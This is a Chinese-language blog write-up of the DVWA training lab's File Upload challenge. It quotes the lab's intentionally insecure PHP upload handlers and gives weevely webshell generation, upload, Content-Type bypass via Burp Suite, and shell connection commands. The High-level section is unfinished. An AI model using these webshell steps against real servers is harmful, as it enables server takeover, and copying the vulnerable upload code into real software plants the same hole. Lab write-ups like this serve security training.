---
layout:     post
title:      DVWA靶机学习——File Upload(文件上传)
subtitle:   这个系列是学习DVWA靶机的。今天学习File Upload的Low、Medium、High、Impossible级别。
date:       2020-07-15
author:     HouKC
header-img: img/post-bg-coffee.jpeg
catalog:    true
tags:
    - CTF
    - web
    - writeup
    - 网络安全
    - dvwa
    - 靶机
---


## 0x00 File Upload(文件上传)
File Upload即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得可以通过上传webshell获取服务器权限，因此文件上传漏洞带来的危害常常是毁灭性的。


## 0x01 Low
#### 源码分析
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```
basename(path, suffix)返回path中的文件名部分，如果可选参数suffix为空，则返回的文件名中包含后缀名，反之不包含后缀名。

这里并没有过滤文件后缀名或其他防御措施。

#### 解题思路
直接上传webshell，用菜刀或weevely连接。
weevely 生成webshell。
kali Linux终端输入：
```
weevely generate pass 1.php		# 在当前路径下生成1.php文件，密码是pass

然后到DVWA上传1.php文件，再到终端输入：
weevely "http://ip地址/dvwa/hackable/uploads/1.php" pass
连接后输入：
system_info		# 可以查看系统信息
shell_sh [cmd]	# cmd是shell命令，如dir
...
```


## 0x02 Medium
#### 源码分析
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```
在Low级别的基础上，多判断了HTTP头中的MIME类型，并限制了文件大小为10000字节。

#### 解题思路
上传文件的时候Burpsuite拦截，修改MIME类型为image/jpeg或image/png即可，即修改HTTP头的第二个Content-Type为image/jpeg或image/png。

weevely 生成webshell。
kali Linux终端输入：
```
weevely generate pass 1.php		# 在当前路径下生成1.php文件，密码是pass

然后到DVWA上传1.php文件，再到终端输入：
weevely "http://ip地址/dvwa/hackable/uploads/1.php" pass
连接后输入：
system_info		# 可以查看系统信息
shell_sh [cmd]	# cmd是shell命令，如dir
...
```


## 0x03 High
#### 源码分析
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```
待补充。

#### 解题思路
待补充。

weevely 生成webshell。
kali Linux终端输入：
```
weevely generate pass 1.php		# 在当前路径下生成1.php文件，密码是pass

然后到DVWA上传1.php文件，再到终端输入：
weevely "http://ip地址/dvwa/hackable/uploads/1.php" pass
连接后输入：
system_info		# 可以查看系统信息
shell_sh [cmd]	# cmd是shell命令，如dir
...
```

